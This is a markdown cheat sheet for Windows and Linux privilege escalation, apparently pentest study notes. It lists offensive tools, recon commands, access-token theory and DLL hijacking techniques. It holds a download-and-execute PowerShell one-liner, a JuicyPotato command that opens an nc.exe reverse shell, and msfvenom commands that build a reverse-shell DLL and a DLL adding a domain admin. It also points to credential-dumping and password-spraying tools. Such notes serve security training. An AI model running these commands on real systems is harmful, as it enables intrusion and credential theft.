## Privilege Escalation (Windows)

[PrivescCheck](https://github.com/itm4n/PrivescCheck) Powershell script used to identify Local Privilege Escalation (LPE) vulnerabilities that are usually due to Windows configuration issues, or bad practices. \
Usage: Place the script on the Windows victim and run this for a basic check:
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```
All checks and reports:
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
```

[WinPwn](https://github.com/S3cur3Th1sSh1t/WinPwn) An all around script with many useful windows attacks. Either run it from the cloned folder by importing it:
```
Import-Module .\WinPwn.ps1
```
Or download and execute from:
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1'
```

[WinPeas](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) Script used to check for common privilege escalation vulnerabilities on a target system.

[Juicy Potato](https://github.com/ohpe/juicy-potato/blob/master/README.md) A very well-known privilege escalation tool. JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, RoguePotato and SharpEfsPotato can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM. An example would be:
```
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *
```

[Rogue Potato](https://github.com/antonioCoco/RoguePotato)

[SharpefsPotato](https://github.com/bugch3ck/SharpEfsPotato)

[Windows Exploit Suggestor](https://github.com/bitsadmin/wesng)

[Windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check) Application that tries to find misconfigurations that could allow local unprivileged users to escalate privileges.

[SharpUp](https://github.com/GhostPack/SharpUp) C# PowerUp alternative.

[Mimikatz](https://github.com/ParrotSec/mimikatz) Well-known exploit tool. 

[Watson](https://github.com/rasta-mouse/Watson) Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.

[PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) This script will run all common areas of misconfiguration that allow for a regular user to get a local administrative or system account.

[Jaws](https://github.com/411Hall/JAWS) JAWS is PowerShell script designed to help quickly identify potential privilege escalation vectors on Windows systems.

[Wesng](https://github.com/bitsadmin/wesng/blob/master/wes.py) Tool based on the output of the systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to

[Seatbelt](https://github.com/GhostPack/Seatbelt) C# tool that does a number of security oriented “safety checks” relevant for both offensive and defensive security.

[beRoot](https://github.com/AlessandroZ/BeRoot/tree/master/Windows) BeRoot(s) is a post exploitation tool to check common Windows misconfigurations to find a way to escalate privilege.

[WCMDump](https://github.com/peewpw/Invoke-WCMDump) PowerShell script to dump Windows credentials from the Credential Manager

[SessionGopher](https://github.com/Arvanaghi/SessionGopher) PowerShell tool to find and decrypt saved session information for remote access tools. (e.g. PuTTY)

[Lazagne](https://github.com/AlessandroZ/LaZagne) Application used to retrieve lots of passwords stored on a local computer from commonly-used software.

[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) PowerShell tool to perform a password spray attack against users of a domain.


 ### Recon
 Before getting attempting privilege escalation, its a good idea to find out what your victim actually currently has:
 
 Check the current user
 ```
 whoami
 ```
 Check the current privs
 ```
 whoami /priv
 ```
 Check the current groups
 ```
 whoami /groups
 ```
 Check all the users
 ```
 net user
 ```
 Check the local administrator group members
 ```
 net localgroup administrators
 ```
 Check hostname
 ```
 hostname
 ```
 Check operating system and architecture
 ```
 systeminfo
 ```
 Get installed patches
 ```
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 ```
 Check Running processes
 ```
 tasklist /svc
 ```
 Check running services
 ```
 wmic service get name,displayname,pathname,startmode
 ```
 Check current privileges
 ```
 whoami /priv & whoami /groups
 ```
 Check networking information
 ```
 ipconfig /all
 ```
 ```
 route print
 ```
 Check open ports
 ```
 netstat -ano
 ```
 Enumerate firewall
 ```
netsh firewall show state
```
```
netsh advfirewall show currentprofile
```
```
netsh advfirewall firewall show rule name=all
```
Enumerate scheduled task
```
schtasks /query /fo LIST /v
```
Installed applications and patch levels
```
wmic product get name, version, vendor
```
Check the architecture
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
Check for drivers
```
driverquery /v
```
List disks
```
wmic logicaldisk get caption,description,providername
```
Check permission on file
```
icalcs "<PATH>"
```
Check Windows Defender status
```
Get-MpComputerStatus
```
List AppLocker rules
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
Get a Users SID
```
wmic useraccount where name="netadm" get sid
```
Stop a service
```
sc stop dns
```
Start a service
```
sc start dns
```

    


### Basic Theory
**Access Tokens** Each user logged onto the system holds an access token with security information for that logon session. The system creates an access token when the user logs on. Every process executed on behalf of the user has a copy of the access token. The token identifies the user, the user's groups, and the user's privileges. A token also contains a logon SID (Security Identifier) that identifies the current logon session.

You can see this information executing:
```
whoami /all
```
**Local Administrator** When a local administrator logins, two access tokens are created: One with admin rights and other one with normal rights. By default, when this user executes a process the one with regular (non-administrator) rights is used. When this user tries to execute anything as administrator ("Run as Administrator" for example) the UAC will be used to ask for permission.

**Credentials user impersonation** If you have valid credentials of any other user, you can create a new logon session with those credentials :

```
runas /user:domain\username cmd.exe
```
The access token has also a reference of the logon sessions inside the LSASS, this is useful if the process needs to access some objects of the network. You can launch a process that uses different credentials for accessing network services using:
```
runas /user:domain\username /netonly cmd.exe
```
This is useful if you have useful credentials to access objects in the network but those credentials aren't valid inside the current host as they are only going to be used in the network (in the current host your current user privileges will be used).

There are two types of tokens available:

**Primary Token**: It serves as a representation of a process's security credentials. The creation and association of primary tokens with processes are actions that require elevated privileges, emphasizing the principle of privilege separation. Typically, an authentication service is responsible for token creation, while a logon service handles its association with the user's operating system shell. It is worth noting that processes inherit the primary token of their parent process at creation.

Impersonation Token: Empowers a server application to adopt the client's identity temporarily for accessing secure objects. This mechanism is stratified into four levels of operation:

1. Anonymous: Grants server access akin to that of an unidentified user.
2. Identification: Allows the server to verify the client's identity without utilizing it for object access.
3. Impersonation: Enables the server to operate under the client's identity.
4. Delegation: Similar to Impersonation but includes the ability to extend this identity assumption to remote systems the server interacts with, ensuring credential preservation.

## DLL Hijacking
DLL Hijacking involves manipulating a trusted application into loading a malicious DLL. This term encompasses several tactics like DLL Spoofing, Injection, and Side-Loading. It's mainly utilized for code execution, achieving persistence, and, less commonly, privilege escalation. Despite the focus on escalation here, the method of hijacking remains consistent across objectives.

### Common Techniques
Several methods are employed for DLL hijacking, each with its effectiveness depending on the application's DLL loading strategy:

1. DLL Replacement: Swapping a genuine DLL with a malicious one, optionally using DLL Proxying to preserve the original DLL's functionality.
2. DLL Search Order Hijacking: Placing the malicious DLL in a search path ahead of the legitimate one, exploiting the application's search pattern.
3. Phantom DLL Hijacking: Creating a malicious DLL for an application to load, thinking it's a non-existent required DLL.
4. DLL Redirection: Modifying search parameters like %PATH% or .exe.manifest / .exe.local files to direct the application to the malicious DLL.
5. WinSxS DLL Replacement: Substituting the legitimate DLL with a malicious counterpart in the WinSxS directory, a method often associated with DLL side-loading.
6. Relative Path DLL Hijacking: Placing the malicious DLL in a user-controlled directory with the copied application, resembling Binary Proxy Execution techniques.

The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters and just show the File System Activity::
1. Result contains Not Found
2. Path ends with .dll

If you are looking for missing dlls in general you leave this running for some seconds. If you are looking for a missing dll inside an specific executable you should set another filter like "Process Name" "contains" "<exec name>", execute it, and stop capturing events.

### DLL Search Order
Windows applications look for DLLs by following a set of pre-defined search paths, adhering to a particular sequence. The issue of DLL hijacking arises when a harmful DLL is strategically placed in one of these directories, ensuring it gets loaded before the authentic DLL. A solution to prevent this is to ensure the application uses absolute paths when referring to the DLLs it requires.

You can see the DLL search order on 32-bit systems below:
1. The directory from which the application loaded.
2. The system directory. Use the GetSystemDirectory function to get the path of this directory.(C:\Windows\System32)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (C:\Windows\System)
4. The Windows directory. Use the GetWindowsDirectory function to get the path of this directory. (C:\Windows)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.

That is the default search order with SafeDllSearchMode enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode registry value and set it to 0 (default is enabled).

If LoadLibraryEx function is called with LOAD_WITH_ALTERED_SEARCH_PATH the search begins in the directory of the executable module that LoadLibraryEx is loading.

Finally, note that a dll could be loaded indicating the absolute path instead just the name. In that case that dll is only going to be searched in that path (if the dll has any dependencies, they are going to be searched as just loaded by name).

Certain exceptions to the standard DLL search order are noted in Windows documentation:
1. When a DLL that shares its name with one already loaded in memory is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. In this scenario, the system does not conduct a search for the DLL.
2. In cases where the DLL is recognized as a known DLL for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, forgoing the search process. The registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs holds a list of these known DLLs.
3. Should a DLL have dependencies, the search for these dependent DLLs is conducted as though they were indicated only by their module names, regardless of whether the initial DLL was identified through a full path.

### Privilege Escalation
Requirements:
1. Identify a process that operates or will operate under different privileges (horizontal or lateral movement), which is lacking a DLL.
2. Ensure write access is available for any directory in which the DLL will be searched for. This location might be the directory of the executable or a directory within the system path.

By default it's kind of weird to find a privileged executable missing a dll and it's even more weird to have write permissions on a system path folder (you can't by default). But, in misconfigured environments this is possible.

Winpeas will check if you have write permissions on any folder inside system PATH.
Other interesting automated tools to discover this vulnerability are PowerSploit functions: Find-ProcessDLLHijack, Find-PathDLLHijack and Write-HijackDll.

### DLL Proxifying
Basically a Dll proxy is a Dll capable of execute your malicious code when loaded but also to expose and work as exected by relaying all the calls to the real library.

You can use Meterpreter to create a malcious DLL (msfvenom). This one is a reverse shell:
```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
Another example:
```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```



## Privilege Escalation (Linux)

[GTFObins](https://gtfobins.github.io/) Most used Linux privesc site.

[Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) Linux automated escalation check. Example:
```
./linpeash.sh
```

[Linenum](https://github.com/rebootuser/LinEnum) Linux automated privesc checker. Example:
```
./linEnum.sh -k <PASSWORD> -e export -t
```
[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration) Example:
```
./lse.sh
```
```
./lse.sh -l 1 -i #get more information
```
```
./lse.sh -l 2 -i #get more and more information
```

[Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

[Linux Priv Checker](https://github.com/linted/linuxprivchecker)

[G0tmilk Cheat Sheet](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) Excellent resource.

### Recon

Check the current user
```
whoami; id
```
Check all the users
```
cat /etc/passwd
```
Check sudo commands the current user can use
```
sudo -l
```
Check hostname
```
hostname
```
Check operatingsystem and architecture
```
cat /etc/*release*; cat /etc/*issue*; uname -a; arch
```
```
lscpu
```
Check Running processes
```
ps aux
```
Check networking information
```
ifconfig
```
```
ip a
```

Check routes
```
route
```
```
ip route4
```

Check arp tables
```
arp -a
```
```
ip neigh
```

Check open ports
```
netstat -tulpn
```

Enumerate firewall
```
cat etc/iptables/*
```
Enumerate scheduled task
```
cat /etc/crontab; ls -lah /etc/cron*
```
```
ls /var/spol/cron; ls /var/spool/cron/crontabs/
```

Installed applications and patch levels
```
dpkg -l
```
Readable/writable files and directories
```
find / -writable -type d 2>/dev/null
```
Unmounted disks
```
cat /etc/fstab
```
```
mount
```
```
/bin/lsblk
```
```
mountvol
```

Device drivers and kernal modules
```
lsmod
```
```
/sbin/modinfo <MODULE>
```

Find SUID / SGID
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Run SUID BIT. Use the following instead of just sudo
```
sudo -u root <PATH TO PROGRAM>
./.<PROGRAM> -p 
```

### Kernel Exploits
Kernels are the core of any operating system. Think of it as a layer between application software and the actual computer hardware. The kernel has complete control over the operating system. Exploiting a kernel vulnerability can result in execution as the root user. Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.

1. Enumerate kernel versions (uname -a)
2. Find matching exploits [Linux Exploit Suggester](https://github.com/jondonas/linux-exploit-suggester-2)
3. Compile and run [Kernel Exploits](https://github.com/lucyoa/kernel-exploits)

### General Techniques

Find all writable files in /etc. 
```
find /etc -maxdepth 1 -writable -type f
```
Find all readable files in /etc. If /etc/shadow is readable. Crack the hashes! 
```
find /etc -maxdepth 1 -readable -type f
```
Find all directories which can be written to:
```
find / -executable -writable -type d 2> /dev/null
```
Look for backup files
```
ls /tmp
```
```
ls /var/backups
```
```
ls /
```
If a program is found check gtfobins https://gtfobins.github.io/


### SUID/SGID
SUID files get executed with the privileges of the file owner. SGID files get executed with the privileges of the file group. If the file is owned by root, it gets executed with root privileges, and we may be able to use it to escalate privileges.

Find SUID and SGID
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```




























































